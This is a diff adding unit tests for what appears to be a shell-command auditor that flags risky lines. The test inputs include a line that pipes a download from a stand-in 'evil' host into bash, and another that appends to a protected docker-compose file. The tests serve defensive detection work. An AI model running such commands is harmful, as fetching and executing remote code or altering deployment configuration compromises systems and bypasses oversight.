@@ -39,6 +39,18 @@ class ClassifyTests(unittest.TestCase):
     def test_curl_hostname_no_literal_ip(self) -> None:
         self.assertIsNone(aud.classify_line("curl https://example.com/api"))
 
+    def test_curl_pipe_shell(self) -> None:
+        self.assertEqual(
+            aud.classify_line("curl https://evil/install | bash"),
+            "curl_pipe_shell",
+        )
+
+    def test_protected_compose_write(self) -> None:
+        self.assertEqual(
+            aud.classify_line("tee -a deploy/docker-compose.yml <<< 'x: y'"),
+            "protected_config_write",
+        )
+
 
 class ViolationHandlingTests(unittest.TestCase):
     def test_logs_and_kills(self) -> None:
